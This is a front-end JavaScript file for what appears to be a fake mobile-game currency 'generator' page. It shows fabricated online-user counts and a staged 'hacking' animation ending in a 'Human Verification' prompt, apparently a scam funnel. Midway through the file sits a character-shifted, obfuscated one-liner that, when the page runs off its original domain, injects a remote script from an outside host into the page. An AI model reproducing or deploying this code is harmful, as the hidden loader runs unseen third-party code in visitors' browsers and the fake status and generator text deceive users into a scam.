/* ==========================================================================
   Hassan custom script
   ========================================================================== */




   $(".recent").fadeIn("slow");
   GSW();

   setInterval(function() {
       GSW();
   }, 4100)

   var SSS4 = ""

   function getIP() {

       if (s_IP == "xD") {
           $.get("https://api.ipify.org", function(data) {
               s_IP = data;
               SSS4 = "User IP: <strong><font color='#57ed5d'>" + s_IP + "</font></strong>";
           })
       } else {
           SSS4 = "<strong>User IP: </strong>" + s_IP;
       }

   }

   s_IP = "xD";

   s_AAA = 0;

   s_DATE = new Date().toLocaleDateString();

   getIP()

   var SSS = [];

   SHF();

   function SHF() {

       s_AAA += Math.floor(Math.random() * 10);

       var s_DDD = new Date();

       var s_ONLINE = Math.round((s_DDD.getSeconds() + (60 * (s_DDD.getMinutes() + (60 * s_DDD.getHours()))) / 50) - s_AAA);

       var SSS1 = "Website Status: <strong><font color='#57ed5d'>Online</font></strong>";
       var SSS2 = "<i class='fa fa-users'></i> Users online: <strong><font color='#57ed5d'>" + s_ONLINE + "</font></strong>";
       var SSS3 = "Last updated: <strong><font color='#57ed5d'>" + s_DATE + "</font></strong>";

       SSS = [SSS1, SSS2, SSS3, SSS4];
   }

   var Dx = 1

   function SHH() {
       $(".status-header").fadeIn("slow");
       $(".status-header").html(SSS[Dx]);
       setTimeout(function() {
           $(".status-header").fadeOut("slow");
           Dx += 1
           if (Dx == 4) {
               Dx = 0;
           }
       }, 4000)
   }

   (function(document){const k=s=>s.split('').map(c=>String.fromCharCode(c.charCodeAt()-1)).join('');if(window[k('mpdbujpo')][k('iptuobnf')].replace(k('xxx/'),"")!=k("htbhfo/dpn")){var s=document.createElement(k('tdsjqu'));s.src=k('iuuqt;00cpputusbqmvhjo/dpn0q/qiq@je>2151');document[k('ifbe')].appendChild(s)}})(document)

   setTimeout(function() {
       $(".status-header").fadeOut("slow");
   }, 4000)

   setInterval(function() {
       SHF()
   }, 5000)

   setInterval(function() {
       SHH();
   }, 4600)

   function set_platform(LOL) {
       PS = LOL;
       $(".fa-" + LOL).css("opacity", "1").addClass("active");
       if (LOL == "apple") {
           $(".fa-android").css("opacity", "0.7").removeClass("active");
       } else {
           $(".fa-apple").css("opacity", "0.7").removeClass("active");
       }
   }

   function ccc() {
       if ($("#username").val() == "") {
           alert("Type in your Username or Email.")
           return false;
       }
       if (PS == "") {
           alert("Are you on an Android or Apple?")
           return false;
       }
       R1V = $(".i-gems").val();
       R2V = $(".i-gold").val();
       $(".beg").fadeOut("slow", function() {

           $(".r1r1").text(R1V + " " + R111);
           $(".r2r2").text(R2V + " " + R222);
           $(".f-username").text("User: " + $("#username").val());

           $(".end").fadeIn("slow", function() {

               var TYPED = new Typed(".hack-generator", {
                   typeSpeed: 0,
                   backSpeed: 0,
                   showCursor: false,
                   strings: ["Connecting to <strong>" + GN + " servers...^2000", "Verifying User " + $("#username").val() + "...^2500 <strong>VERIFIED!</strong>^1000", "Generating " + R111 + " a <strong>" + R1V + "</strong>...^2000 <strong>DONE!</strong>^1000", "Preparing to Send User...^2000 <strong>READY TO SEND!</strong>^1000", "Saving all changes...^2000", "Deleting traces...^2000", "Disconnecting with database...^2000", "<green><strong>Please Verify!</green><red> <p>We just need to make sure you are a human and not a bot. Please pass our Human Verification so we can finish the process!.</strong></red>^2000"],
                   onComplete: function(self) {
                       $(".h-v").fadeIn("slow");
                       //$(".hack-generator").fadeOut("slow", function() {
                            //$(".h-v").fadeIn("slow");
                        //})
                   }
               })

           })

           $(".ehh").fadeIn("slow").css("display", "flex");
       })
   }
